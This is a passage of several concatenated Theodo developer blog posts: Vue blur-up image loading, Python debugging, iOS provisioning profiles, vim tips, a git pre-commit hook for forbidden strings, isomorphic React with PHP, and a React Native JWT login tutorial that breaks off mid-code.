When we change the opacity of the low resolution image, we can see the ugly pixels because browsers aren’t able to blur the image while its opacity changes.
But don’t worry, there’s an easy way to solve this!
We’re going to use canvas, because browsers can actually blur canvas while their opacity changes with a little trick!
So, let’s change our template:
<template>
  <transition-group name=""blur"" tag=""div"">
    <div v-show=""currentSrc === null"" class=""placeholder blur-transition"" key=""placeholder""></div>
    <canvas v-show=""currentSrc === loResSrc"" height=""17"" width=""27"" key=""canvas"" class=""blur-transition""></canvas>
    <img v-show=""currentSrc === hiResSrc"" :src=""hiResSrc"" key=""image"" class=""blur-transition""></img>
  </transition-group>
</template>

And our style:
<style scoped>
  img, canvas, .placeholder {
    height: 600px;
    width: 900px;
    position: absolute;
  }
  .placeholder {
    background-color: rgba(0,0,0,.05);
  }
  canvas {
    filter: blur(10px);
  }
  .blur-transition {
    transition: opacity linear .4s 0s;
    opacity: 1;
  }
  .blur-enter, .blur-leave {
    opacity: 0;
  }
</style>

You can see that we’ve set the height and weight attributes of our canvas in the template and streched it out in our style.
You might also have spotted the little trick: we can add a blur filter attribute on the canvas and it will still be here even if the opacity of our element changes!
I’ve set it to 10px empirically, but you can learn more about the canvas filter here.
Once we’ve done this, we need to draw our low resolution image inside the canvas once it is loaded:
<script>
  export default {
    props: [
      'hiResSrc',
      'loResSrc'
    ],
    data: function() {
      return {
        currentSrc: null
      }
    },
    mounted: function () {
      var loResImg, hiResImg, that, context;
      loResImg = new Image();
      hiResImg = new Image();
      that = this;
      context = this.$el.getElementsByTagName('canvas')[0].getContext('2d'); // get the context of the canvas

      loResImg.onload = function(){
        context.drawImage(loResImg, 0, 0);
        that.currentSrc = that.loResSrc;
      }
      hiResImg.onload = function(){
        that.currentSrc = that.hiResSrc;
      }
      loResImg.src = that.loResSrc;
      hiResImg.src = that.hiResSrc;
    }
  }
</script>

You can see the final result on this Codepen: http://codepen.io/zkilo/pen/ZLyweL.
And that’s it!

You can find the component as a .vue file on this Github repository.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Louis Zawadzki
  			
  				I drink tea and build web apps at Theodo.  			
  		
    
			

									"
"
										
There’s something I want you to learn. I can’t tell you what it is right now. You’ll have to trust me blindly and follow the instructions closely.


Part 1 — Be a challenger
We’re going to look at some buggy python code. Don’t leave just yet if you have never written python before! You will find something to apply to you preferred everyday language, I promise. If I lied, you are allowed to insult me abundantly through your favorite channel (here’s my Twitter, you’re welcome). Here’s your code, commented so that you know what happens.
def foo(a, methods=[]): # methods defaults to [] if not specified                      
    for i in range(3):
        # Append an anonymous function, which returns `x + i`
        # when given `x`
        methods.append(lambda x: x + i)
    
    sum_methods = 0
    # For each function `method` of in `methods`, sum `method(a)`
    for method in methods:
        sum_methods += method(a)
    return sum_methods

You expect your function to output the following:

foo(0) = (0 + 0) + (0 + 1) + (0 + 2) = 3
foo(1) = (1 + 0) + (1 + 1) + (1 + 2) = 6
foo(2) = (2 + 0) + (2 + 1) + (2 + 2) = 9
foo(2, [lambda x: x]) = ((2)) + ((2 + 0) + (2 + 1) + (2 + 2)) = 11

Simple, right? Let’s try it in our terminal.
>>> foo(0)
6
>>> foo(1)
18
>>> foo(2)
36
>>> foo(2, [lambda x: x])
14

Well, there seems to be a minor error. But wait, could we have missed something? Let’s check again.
>>> foo(0)
24
>>> foo(1)
45
>>> foo(2)
72

WHAT.
THE.

He’s not screaming what you think he is

But, you’re not going to get beaten down by this, right? You will pull your shirtsleeves up your arms (provided you wear a shirt, which would be unusual but we’re not judging), and you will find out what is wrong using well-placed print statements or other debugging practices you know.
Set a stopwatch, try to debug the code by clicking here, and please let me know how much time it took you to understand and fix what’s wrong in the comments, and what practices you used. Keep both for loops and don’t change the foo function calls because it would be too easy. Got it? Go!









Part 2 — Behold the Light
Before jumping to the answer, let’s talk about debuggers. Every language I know has a way to be debugged. Debuggers lets you explore each line of the code in a convenient way.
Every debugger has at least the following commands, that you can use directly in python code:

Set a break point, where the execution will halt: pdb.set_trace() . I usually set my breakpoints with import pdb; pdb.set_trace() since Python is not bothered with importing the same library several times and in an inline fashion.
Continue until next break point: c
Next line: n
List the surrounding code: l
Help: h

Debuggers are Life
—  Experts
So how much quicker could you have been by using a debugger instead of trial-and-error and print statements?
I’ve tried this hypothesis on two separate groups of people: one where they used print statements, and one where they used the debugger. The second group took 9 minutes on average, and the first one 14 minutes! That’s a 35% speedup on an 8-line-long program.
Now imagine you encountered these bugs hidden in a much bigger program? I know a lot of developers that spend hours debugging a bug with print statements and waste a lot of time. The challenge is to find out exactly where you are in the code, but you get used to it very quickly, either by setting a lot of breakpoints, or by using the l command. Debuggers walk you through the code and they make understanding some new code much easier.

Mia found out about debuggers at an early age and is still amazed! Be like Mia.

Do you want your solution then? I’ve made a video of me using a python debugger (don’t mind the occasional typos please). It’s a bit long but I kept it real-time so you can see the debugging process more clearly. Here’s the video:

Additional info: methods was broken because lists in python are mutable objects. It means that when methods is set to the default value (the empty list) and is then changed, the default value is also updated (and becomes the empty list with one more element). This is a common pitfall that you can fix using a None default value. Here is the full corrected code:
def methods_generator(i):  # Scopes the i to not overwrite it
    return lambda x: x + i

def foo(a, methods=None):
    if methods is None:  #Prevents the default value to be changed 
        methods = []
    for i in range(3):                  
        methods.append(methods_generator(i))
    
    sum_methods = 0
    for method in methods:
        sum_methods += method(a)
    return sum_methods

Part 3 — Debugging resources
I promised I would write about other languages, and I will keep this promise right now! Here are useful resources I came across, please don’t hesitate to submit more! I also including resources about code linting (that analyzes your code looking for typos and common errors) and gotchas (which are common pitfalls in a language, just like the mutable list default value above).
PHP

Configuring your debugger in PHPStorm with XDebug through a Vagrant machine
An Atom package for PHP debugging
A linter for PHP in atom
PHP gotchas (use Google for more)

Javascript

To debug your front-end code, you can set a breakpoint by typing debugger anywhere in your code. The execution will halt only if you have the developper tools opened in your browser! Make sure you don’t commit it :).
Debugging in NodeJS
A comparison of Javascript linting tools, for which you can find related atom and sublime packages.
Javascript gotchas

Python

Additional debugging tips
You can also use ipdb instead of the native pdb library to debug with ipython (trust me it’s great)
If you use Jupyter notebooks you can debug easily in them
Though I prefer flake8, here is a list of linting tools for python.
Python gotchas (thanks @christianwitts!)

Java

Here is a debugging tutorial on Eclipse
Lint your code with SonarLint
Java gotchas

C#

Debugging in Visual Studio
There’s an embedded linter in Visual Studio called FxCop
C# and .NET gotchas

Ruby

An Atom package for Ruby debugging
This answer on Stackoverflow covers linters for Ruby
Ruby gotchas










Happy debugging, happy life!




										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Flavian Hautbois
  			
  				Developer at Theodo. Musician, entrepreneur, fanatic of innovation, science, and technology. Failed one startup so far.  			
  		
    
			

									"
"
										If you’ve spent any time developing an app for iOS, then you’ve probably stumbled across the bit of the Developer Console called ‘Certificates, Identifiers & Profiles’.

This is not a blog post about how to do anything in that section.
Instead, it’s a rough guide to what everything means — in the hope of providing some relief/context when you’ve just seen the error ‘No code signing identities’ for the millionth time and feel like throwing your laptop out the window while shouting ‘Code sign this!’
(Note: this article focuses on App Store apps, rather than in-house apps, which you can create through the Apple Developer Enterprise Program.)
Why Provisioning Profiles?
Good question. The key thing is that, unlike Android, you can’t install any old app on an iOS device: it has to be signed by Apple first.1 However, when you’re developing an app, you probably want to test it before sending it to Apple for approval. Provisioning profiles are simply a way for you to do that: they’re like a ‘temporary visa’ that lets you run and test your app on a physical device. And like all good visa schemes, this means dealing with some bureaucracy…
The Components
Provisioning profiles always require the following components:2

A certificate
A unique app identifier (an ‘App ID’)

In some cases, they also require:

A list of devices the app can run on

The Certificate
This is a public/private key-pair, which identifies who developed the app.3 (Without such certificates, I could e.g. create an app called ‘Facebook’ and pretend that it’s an update to the actual Facebook — and hence trick you into giving me your login credentials.)
When you try to create a new certificate, you’ll be presented with several options. For provisioning profiles, the key ones are:

iOS App Development: a development certificate. These are for developers who want to test the app on a physical device while writing code.
App Store and Ad-Hoc: a distribution certificate. These are for when you’re ready to give the app to other people — first for testing (the ‘Ad-Hoc’ bit) and then for general distribution via TestFlight or the App Store.

When you join an iOS development team, you’re either a ‘Member’ or an ‘Admin’. Anyone can create development certificates, but only those with admin privileges can create distribution certificates.
The App ID
This is a unique identifier for your app. Apple recommends using a ‘reverse-domain name style string’ of the form: com.yourcompanyname.yourappname. You can then associate ‘entitlements’ to your App ID, such as iCloud, Push Notifications, Apple Pay, etc.
It’s also possible to create ‘wildcard’ App IDs, e.g. com.yourcompanyname.*, which can be used for multiple apps. While these can be useful in some cases, note that you can’t associate entitlements to them.
Extra tip: if you’re planning on releasing an Android app as well, then you should avoid using hyphens (-) in your App ID — otherwise you won’t be able to use the same one on both platforms.
The List of Devices
This is a list of devices.
This is perhaps the most annoying part of the process: if you want to distribute your app to testers (without using TestFlight), then they need to send you their device’s ‘Unique Device Identifier’ or UDID. Unfortunately, you can’t find it within iOS itself: they’ll need to connect their device to a computer.
I heartily recommend the website whatsmyudid.com, which provides clear, illustrated instructions about what to do. However, you should still mentally prepare yourself for people sending you all kinds of random, irrelevant strings with the question: ‘Is this it?’ (Hint: if it’s not a 40-character, hexadecimal string, then the answer is no.4)
Creating a Provisioning Profile
Congratulations, you’re now ready to build your provisioning profile! Again, there are quite a few options, but the main ones are:

iOS App Development: for testing the app on a physical device while developing.
Ad Hoc: for distributing the app to non-TestFlight testers (e.g. via HockeyApp).
App Store: for distributing the app via TestFlight or the App Store. (Note that this one doesn’t work on its own: your app will still need signing by Apple.)

Here are the key differences between them:



Provisioning Profile
Certificate
App ID
List of Devices


iOS App Development
iOS App Development
Yes
Yes


Ad Hoc
App Store and Ad-Hoc
Yes
Yes


App Store
App Store and Ad-Hoc
Yes
No



So when iOS attempts to install an app, it checks the following things:

That the private key used to sign the app matches the public key in the certificate;
That the App ID is correct;
That the entitlements required are associated with the App ID;
That the device itself is in the list of devices.

If anyone of these conditions fail, then the app will not install — and you’ll see a greyed-out app icon with no error message or clue for how to proceed. But at least now you have somewhere to start: you can go through those four bullet points manually, and make sure everything is as it should be. (We’ve found it’s usually an issue with the list of devices.)
The End
I hope this post helped demystify what’s going on when you create a provisioning profile. If not, then please feel free to leave a question in the comments below!

Footnotes
1 This doesn’t apply to the iOS simulator or a jailbroken device. [back]
2 Note that these correspond to the sections of the left-hand menu within ‘Certificates, Identifiers & Profiles’. [back]
3 Although this is all a lot more elaborate than Android’s system, one of the great advantages is that you can recreate certificates. On Android, if you lose the original private key then you’re screwed: you won’t be able to update your original app, and you’ll have to convince all your existing users to download a new one. [back]
4 I once even got sent a 40-character, hexadecimal string that wasn’t a valid UDID, and looked nothing like the actual one they eventually sent me. To this day, I still have no idea where they got it from. [back]

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Hari Sriskantha
  			
  				Agile Web and Mobile Developer  			
  		
    
			

									"
"
										
kbd {
  display: inline-block;
  padding: 3px 5px;
  font-size: 11px;
  line-height: 10px;
  color: #555;
  vertical-align: middle;
  background-color: #fcfcfc;
  border: solid 1px #ccc;
  border-bottom-color: #bbb;
  border-radius: 3px;
  box-shadow: inset 0 -1px 0 #bbb
}

Sometimes, you have to ssh on a server to fix some configuration files or to test a feature that you cannot test locally. You don’t have your favourite text editor with all your configuration here.
Most of the time, you have to rely on vim or nano in this situation.
Your coworkers told you that nano is for newbies and you want to gain some street credibility, so you use vim.

Your beard is not long enough for emacs.  You wouldn’t be here anyway
Here is a guide to help you solve the annoying problems that you may face with vim.
When you forget to sudo
Your server has a configuration issue, and you have to fix the configuration file, so you go vim <path-to-your-config-file>.
You make a bunch of changes, Esc:x to save the file and exit and then:
E505: ""<your-config-file>"" is read-only (add ! to override)
You forgot about the sudo and now you think you have to drop your changes, and open vim again with sudo this time.

Fortunately, there is a solution: :w !sudo tee %
Let’s analyse this command:


:w doesn’t write in your file in this case. If you are editing file1 with vim and type :w file2, you will create a new file named file2 with your buffer and file1 will be left untouched.
Here, you write to the “file” !sudo tee %.


!sudo: The bang ! lets you execute a command as if you were in a shell, in this case sudo to get superusers rights.


tee sounds like the letter T for a reason: it acts like a T-shaped pipe. It takes a filename in argument, and redirects the output to the file you gave it and to the standard output.


% refers to the current file in vim.

You now have the full equation: :w writes the buffer into tee (with superuser rights) that redirects the buffer into the current file (and to the standard output, but that’s not useful here)


Pastemode
What’s more frustrating than pasting a snippet of code and having your formatting all messed up, especially in languages like Python where indentation is part of your code?
Example:

You can switch to paste mode which allows you to paste text as is.
Simply type :set paste in normal mode and then you’re good to go (do not forget to switch to insert mode before pasting). Look carefully, everything happens on the last line of the video.

You might wonder: why not stay in paste mode all the time? Well it changes some of the configurations of vim like smarttabs and smartindent.
However, if you have a lot of copy / pasting to do, you can use set pastetoggle=<F2> to set a toggle. Pressing F2 will switch paste mode on and off. You can replace F2 with any key you like. More info with :help paste.
Searching for text
Chances are that you will look for something in the file you are trying to edit.
In normal mode simply type /<your-search>.
It will highlight text that matches and you can press n to go to the next or N to go to the previous occurrence.
Notice how the text is left highlighted even after you entered insert mode? You can stop the highlighting by typing :noh as in “no highlight”.

Block comment
Sometimes, you have to test your file with a part of the code removed and the quickest way to do this without losing it is to comment it.
To comment multiple lines at once, simply put the cursor on the first column by pressing 0 at the top (or bottom) of the block you want to comment and press Ctrl + v
You are now in visual block mode where you can select a bloc of text, in our case a column. Go down or up and select the lines you want to comment. Press Shift + I and insert your programming language comment symbol. It will only print on the highest row selected. Then press Esc Esc and boom, your lines are commented!
Press u to cancel the change, or simply bloc select it again and press x.

Indent
Press v to select text and then press  <  or  >  to indent in either direction. You can combine it with navigation actions. For example  >   G  will indent all lines from the cursor to the end of the file.

However, it will indent your file of shiftwidth spaces. By default this value is 8 and that is quite big. You can use :set shiftwidth=<your-value> to adapt it to the indent style of your file.
Bonus: quick navigation

$ goes to end of line
0 goes to the beginning of the line (column 1) while ^ goes to the first non blank character
gg goes to the top of the file while G goes to the bottom
% goes to the matching parenthesis/bracket
Ctrl + F goes one page down and Ctrl + B goes one page up (think forward and backward to remember it)
u cancels your last action and Ctrl + r reapplies it

I hope this article made Vim less painful.
You can share your tips in the comments.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Alexandre Chaintreuil
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										Today, for the 185th time, I accidentally committed some debugging code on my project. But there won’t be a 186th time.
How hard can it be to get a warning when I’m about to commit a diff that contains certain forbidden strings?
Of course it isn’t – it’s called pre-commit hooks.
And Github user pimterry came up with a pre-commit hook that does just this and lets you choose whether to abort or to commit nevertheless.
Setting it up
To check for the presence of Mocha’s describe.only and it.only methods on my project, I added these two entries to my Makefile:
install-git-hook:
	curl https://cdn.rawgit.com/pimterry/git-confirm/v0.2.1/hook.sh > .git/hooks/pre-commit && chmod +x .git/hooks/pre-commit && make configure-git-hook

configure-git-hook:
	git config --unset-all hooks.confirm.match || echo 'Nothing to clear'
	git config --add hooks.confirm.match 'describe.only'
	git config --add hooks.confirm.match 'it.only'
How it works

install-git-hook tries to download and install pimterry’s hook on your project.
configure-git-hook sets up 2 forbidden strings: it.only and describe.only. Replace these with the ones you need.

Then, run make install-git-hook in your project directory.
Now when you commit a file containing a forbidden string, this is what you get:

The default configuration includes a few usual suspects such as TODO and @ignore.
Viewing or editing your list of forbidden keywords is all a matter of playing with git config. You can refer to the Git Confirm repo for details.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Foucauld Degeorges
  			
  				Software Architect and Developer at Theodo.  			
  		
    
			

									"
"
										How to improve the speed of a React application?
React is an incredible framework. You may have already learnt it from another post. However, it is a client-side framework and as such, it has a few drawbacks:

search bots do not see the page content *
a user with disabled javascript cannot see the page

OK, these are not the first things you are worried about when you create a website. The main drawback of such frameworks is the initial page load. According to an Akamai report, 25% of Internet connections are below 4Mbps.
For these 25% connections, a typical connection flow for a medium React
application (bundle of 1MB) is the following:

It takes 2 seconds for the user to see your application!
What is an Isomorphic application and why does it speed up my React application?
An isomorphic application is an application that shares the same codebase on the server side and on the client side. By sharing the same codebase, it is possible to render a page on the server side and send directly the result to the client. This result in the following flow:

Now the users will fetch the first page twice faster, your website will have a greatly enhanced Search Engine Optimisation (SEO), and people that sadly don’t have javascript will be able to admire your application.
If you are not convinced yet by isomorphic applications, you will be in a few lines. As there is only one common codebase, the code is easier to maintain and to test. Finally, you have a common state between the client and the server which makes it easier to debug your application.
How does it work?
Until now, isomorphic applications consisted in rendering the html code in a headless browser on the server such as PhantomJS. However, React is different from other Single-Page Application (SPA) frameworks thanks to its virtual DOM, an in-memory DOM decreasing the number of costly DOM modifications. With its virtual DOM, React does not need a headless browser to render a page and it is now possible to do it anywhere Javascript can be run. And this can be done on the server side thanks to the v8 engine and the various libraries to bind the engine to a specific language.
I want to do it, what should I do?
Creating an Isomorphic React application is actually simple. In order to integrate your React application into a PHP server, you will need to install v8js which embeds the v8 engine in PHP. Here are instructions to install it on Mac, Linux, and Windows.
The React team has created react-php-v8js which is dedicated to rendering React components in PHP. Let’s start a new project and use this package:
mkdir isomorphic-react && cd $_
composer require reactjs/react-php-v8js

To create our compiling pipeline, create a package.json file with the
following:
{
  ""name"": ""php-and-react"",
  ""version"": ""0.1.0"",
  ""scripts"": {
    ""make"": ""npm run make-dev && npm run make-min && npm run make-table"",
    ""make-dev"": ""browserify -t [ envify --NODE_ENV development ] src/react-bundle.js > build/react-bundle.js"",
    ""make-min"": ""browserify -t [ envify --NODE_ENV production ] src/react-bundle.js | uglifyjs > build/react-bundle.min.js"",
    ""make-table"": ""babel --presets react src/app.js > build/app.js""
  },
    ""dependencies"": {
    ""babel-cli"": ""^6.3.17"",
    ""babel-preset-react"": ""^6.3.13"",
    ""browserify"": ""^12.0.1"",
    ""envify"": ""^3.4.0"",
    ""react"": ""^0.14.5"",
    ""react-dom"": ""^0.14.5"",
    ""uglifyjs"": ""^2.4.10""
  }
}

Then to install the dependencies, run:
npm install

In the src folder, let’s create a react-bundle.js file which will load all the libraries.
// These dependencies will be compiled by browserify afterwards.
global.React = require('react');
global.ReactDOM = require('react-dom');
global.ReactDOMServer = require('react-dom/server');

We can then create a very simple React component in app.js:
var App = React.createClass({
  render() {
    return (
      <p>
        The server time is {this.props.time}.
      </p>
    );
  }
});

Finally, let’s build our PHP server.
<?php

// Load the dependencies
require_once('vendor/autoload.php');

// Create the ReactJS object
$rjs = new ReactJS(
  // location of React's code
  file_get_contents('build/react-bundle.js'),
  // application code
  file_get_contents('build/app.js')
);

// Data that will be handed over to the component
$props = [
  ""time"" => date(""H:i:s"")
];

// Set the current component to render
$rjs->setComponent('App', $props);

?>

<html>
  <head>
    <title>React from PHP</title>
  </head>
  <body>
    <!-- Insert the rendered content here -->
    <div id=""app""><?php echo $rjs->getMarkup(); ?></div>

    <!-- load react and app code -->
    <script src=""build/react-bundle.min.js""></script>
    <script src=""build/app.js""></script>

    <!-- client-side render -->
    <script>
      <?php echo $rjs->getJS('#app', ""GLOB""); ?>
    </script>
  </body>
</html>

The last lines of code, echo $rjs->getJS('#app', ""GLOB""), loads the scripts and executes a client-side rendering. This way, the initial load uses the fast server-side rendering and the subsequent calls use the (already loaded) framework router.
Run php -S localhost:5678 and voilà! A PHP server is now running, rendering the view in the backend.
Caveats
Server side rendering is not as simple (for the server) as serving static files. If your server is too slow, the rendering can take more time than serving the files to the client, hence loosing one of the advantage of isomorphic applications. You may want to consider this point before switching your application to isomorphic.
Useful links

isomorphic-react-with-php is a sample project with everything described here.
react-php-v8js is the library used to render pages.
symfony-react-sandbox is a project to integrate react application inside symfony applications.

* This is not so much true anymore as Google bots runs the Javascript code and
API calls to fully render the page. This is not a guaranteed result however, nor the case of every spider bot (Facebook, Twitter, Yahoo, Bing, etc).

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Clément Escolano
  			
  				Developer at Theodo  			
  		
    
			

									"
"
										When developing a mobile app, it’s common to have to build an authentication system. However, requiring the users to provide their username and password every time they launches the app, severely deteriorates the user experience.
Lately, I have been working on a side project to build a mobile app with React Native and I wanted to implement a persistent user session. So, what I want to share today is how to:

bootstrap an app that works both on Android and iOS platforms (thank you React Native!)
allow a user to sign up or log in using a JWT authentication process with a backend API
store and recover an identity token from the phone’s AsyncStorage
allow the user to get content from an API’s protected route using the id token
verify the id token’s existence to create the persistent user session

Setting up the authentication API
Since building a complete authentication API would take too much time, we’ll use an authentication API sample coded by Auth0. Please refer to the repository’s documentation for more details about the routes we’ll be using as our app’s backend.
Let’s clone the repo from GitHub and get the API up and running
git clone https://github.com/auth0-blog/nodejs-jwt-authentication-sample.git
cd nodejs-jwt-authentication-sample
npm install
node server.js

DISCLAIMER: It’s worth noting that, for the purpose of this demo, we use http protocol. If you ever ship this code to a production environment, it’s very important to use https for security reasons.
Bootstrap our React Native app
In order to keep this article more concise, I’ll assume your React native development environment is already configured. In case you need any help with this, please take a look at this article, written by Grégoire Hamaide, in which he explains how to install all you need to get started.
Let’s build our project:
react-native init ReactNativeAuth
cd ReactNativeAuth
react-native run android

One of the biggest interests of using React Native is writing code that works both on Android and iOS platforms. We’ll create a new directory called app, where a common code will be written and used by both platforms. Inside it, we’ll create an index.js file that will be the entry point to our application:
// app/index.js

import React, {Component} from 'react';
import {Text} from 'react-native';

class App extends Component {
  render() {
    return(
      <Text> Hello World! </Text>
    )
  }
}

export default App;

In order to redirect both Android and iOS entry points to app/index.js, we have to change both index.android.js and index.ios.js files:
// index.android.js

import {AppRegistry} from 'react-native';
import App from './app';

AppRegistry.registerComponent('ReactNativeAuth', () => App);



// index.ios.js

import {AppRegistry} from 'react-native';
import App from './app';

AppRegistry.registerComponent('ReactNativeAuth', () => App);

Building the authentication system
Our example app contains 2 pages:

An authentication page, where a user will be prompted an username and a password and will be able to either sign up or log in
A protected homepage, where the user will be able to get protected content from the API or log out.

Setting up the app’s router and scenes
One of the most popular routing systems is react-native-router-flux, which is pretty simple to use and will allow us to focus on the authentication process without loosing too much time.
Discussing how to use the router is not our goal, so if you’d like to get a better grasp of how to use it, please refer to this article written by Spencer Carli.
Let’s go and install it:
yarn install react-native-router-flux

We’ll import Router and Scene from react-native-router-flux package and create the 2 scenes we’ve described earlier, which will be called Authentication and Homepage
// app/index.js

import React, {Component} from 'react';
import {Router, Scene} from 'react-native-router-flux';

class App extends Component {
  render() {
    return(
      <Router>
        <Scene key='root'>
          <Scene
            component={Authentication}
            hideNavBar={true}
            initial={true}
            key='Authentication'
            title='Authentication'
          />
          <Scene
            component={HomePage}
            hideNavBar={true}
            key='HomePage'
            title='Home Page'
          />
        </Scene>
      </Router>
    )
  }
}

export default App;

Now that the router is defined, let’s create both our scenes and test the scene transitions to verify if our Router is working as expected. We’ll start with the Authentication class:
// app/routes/Authentication.js

import React, {Component} from 'react';
import {Text, TextInput, TouchableOpacity, View} from 'react-native';
import {Actions} from 'react-native-router-flux';
import styles from './styles';

class Authentication extends Component {

  constructor() {
    super();
    this.state = { username: null, password: null };
  }

  userSignup() {
    Actions.HomePage();
  }

  userLogin() {
    Actions.HomePage();
  }

  render() {
    return (
      <View style={styles.container}>
        <Text style={styles.title}> Welcome </Text>

        <View style={styles.form}>
          <TextInput
            editable={true}
            onChangeText={(username) => this.setState({username})}
            placeholder='Username'
            ref='username'
            returnKeyType='next'
            style={styles.inputText}
            value={this.state.username}
          />

          <TextInput
            editable={true}
            onChangeText={(password) => this.setState({password})}
            placeholder='Password'
            ref='password'
            returnKeyType='next'
            secureTextEntry={true}
            style={styles.inputText}
            value={this.state.password}
          />

          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogin.bind(this)}>
            <Text style={styles.buttonText}> Log In </Text>
          </TouchableOpacity>

          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userSignup.bind(this)}>
            <Text style={styles.buttonText}> Sign Up </Text>
          </TouchableOpacity>
        </View>
      </View>
    );
  }
}

export default Authentication;

Let’s go through the details of what we just wrote. We have:

an Authentication class with a constructor that sets the initial state with two uninitialized variables: username and password
the methods userSignup and userLogin that will be used further on to implement the authentication process. The only thing they do for now is to call the Action method from react-native-router-flux and make a scene to transition to the Homepage scene
a render method, which will display two text inputs (whose values are already bound to our Component’s state) and two buttons, each one bound to the userSignup and userLogin methods.

Moving forward and defining the Homepage class:
// app/routes/Homepage.js

import React, {Component} from 'react';
import {Alert, Image, Text, TouchableOpacity, View} from 'react-native';
import {Actions} from 'react-native-router-flux';
import styles from './styles';

class HomePage extends Component {

  getProtectedQuote() {
    Alert.alert('We will print a Chuck Norris quote')
  }

  userLogout() {
    Actions.Authentication();
  }

  render() {
    return (
      <View style={styles.container}>
        <Image source={require('../images/chuck_norris.png')} style={styles.image}/>

        <TouchableOpacity style={styles.buttonWrapper} onPress={this.getProtectedQuote}>
          <Text style={styles.buttonText}> Get Chuck Norris quote! </Text>
        </TouchableOpacity>

        <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogout}>
          <Text style={styles.buttonText} > Log out </Text>
        </TouchableOpacity>
      </View>
    );
  }
}

export default HomePage;

Again, let’s go through the details of what we just wrote. This time, we have:

a HomePage class with no constructor defined because our component is stateless
a getProtectedQuote method, that will be responsible for communicating with an API’s protected route to recover a funny Chuck Norris quote. At the moment it just shows an alert popup with a title.
an userLogout method, that redirects the user to the Authentication scene for now.
a render method, which will display an image and two buttons, each one bound to the getProtectedQuote and userLogout methods

Both our scenes import basic style properties from an external file, which can be seen on our this project’s repository.
Authenticating the user
The first step is to create a method that will save the received id token from the API in the AsyncStorage, the equivalent of the the browser’s LocalStorage.
The reason the token needs to be stored is that we need to be able to recover it every time we have to call a protected API route and later on to create the persistent user session.
// app/routes/Authentication.js

import {AsyncStorage, (...)} from 'react-native'

class Authentication extends Component {
  (...)

  async saveItem(item, selectedValue) {
    try {
      await AsyncStorage.setItem(item, selectedValue);
    } catch (error) {
      console.error('AsyncStorage error: ' + error.message);
    }
  }

  (...)
}

export default Authentication;

This method saves a selectedValue in the AsyncStorage under the key item. Any eventual error is logged to the console.
We are now ready to start coding our userSignup method:
// app/routes/Authentication.js

userSignup() {
  if (!this.state.username || !this.state.password) return;
  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.
  fetch('http://192.168.XXX.XXX:3001/users', {
    method: 'POST',
    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: this.state.username,
      password: this.state.password,
    })
  })
  .then((response) => response.json())
  .then((responseData) => {
    this.saveItem('id_token', responseData.id_token),
    Alert.alert( 'Signup Success!', 'Click the button to get a Chuck Norris quote!'),
    Actions.HomePage();
  })
  .done();
}

Let’s explain what we’ve just coded:

First of all, we verify if the username and password fields have been filled (their initial value is null)
We use the Fetch API to make a POST request to our backend API, where the body contains the username and password from the component’s state.
If the request succeeds, we store the returned id token in the AsyncStorage under the key id_token. Then we show the user an alert showing the sign-up process succeeded and redirect him/her to the protected scene HomePage.

The process to make the user login is pretty much the same:
// app/routes/Authentication.js

userLogin() {
  if (!this.state.username || !this.state.password) return;
  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.
  fetch('http://192.168.XXX.XXX:3001/sessions/create', {
    method: 'POST',
    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
    body: JSON.stringify({
      username: this.state.username,
      password: this.state.password,
    })
  })
  .then((response) => response.json())
  .then((responseData) => {
    this.saveItem('id_token', responseData.id_token),
    Alert.alert('Login Success!', 'Click the button to get a Chuck Norris quote!'),
    Actions.HomePage();
  })
  .done();
}

The user may now create an account and log into the application with an id token correctly stored.
The next step is to write the userLogout method:
// app/routes/HomePage.js

import {Alert, AsyncStorage, (...)} from 'react-native';

class HomePage extends Component {
  (...)

  async userLogout() {
    try {
      await AsyncStorage.removeItem('id_token');
      Alert.alert('Logout Success!');
      Actions.Authentication();
    } catch (error) {
      console.log('AsyncStorage error: ' + error.message);
    }
  }

  (...)
}

What this method does is pretty straightforward. The stored item under the key id_token is removed from the AsyncStorage. Then the user is alerted that the session is over and he/she is redirected to the Authentication scene.
Getting data from the protected API’s route
The next step is to make use of the id token stored in the AsyncStorage to get protected content from the API. The token should be sent on the request’s authorization header so that the API may verify the user’s identify and return the content if authorized
// app/routes/HomePage.js

getProtectedQuote() {
  AsyncStorage.getItem('id_token').then((token) => {
    // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.
    fetch('http://192.168.XXX.XXX:3001/api/protected/random-quote', {
      method: 'GET',
      headers: { 'Authorization': 'Bearer ' + token }
    })
    .then((response) => response.text())
    .then((quote) => {
      Alert.alert('Chuck Norris Quote', quote)
    })
    .done();
  })
}

Creating a persistent user session
As of this moment, our application is completely functional! It’s capable of performing the three basic authentication operations (sign-up, login, and log out) and using the user’s identifier to get protected content from the API.
However, there’s still a problem to solve: every time the user closes the app and restarts it, he/she’s required to go through the authentication process again.
The desired behavior is that, at the application launch, the existence of a token in the AsyncStorage is verified and dynamically change the initial parameter on our Router‘s scenes. The home page should be the initial scene if the user has a token. Otherwise, it should be the authentication scene.
If we look at a React component’s lifecycle documentation, the method componentWillMount is called before the render method. If the existence of the token could be verified and the state set before the component is rendered, the problem would be solved, right? Wrong!
Let’s write the code for what we just said and then we’ll discuss why it doesn’t work:
// app/index.js

import {AsyncStorage} from 'react-native';

class App extends Component {

  constructor() {
    super();
    this.state = { hasToken: false };
  }

  componentWillMount() {
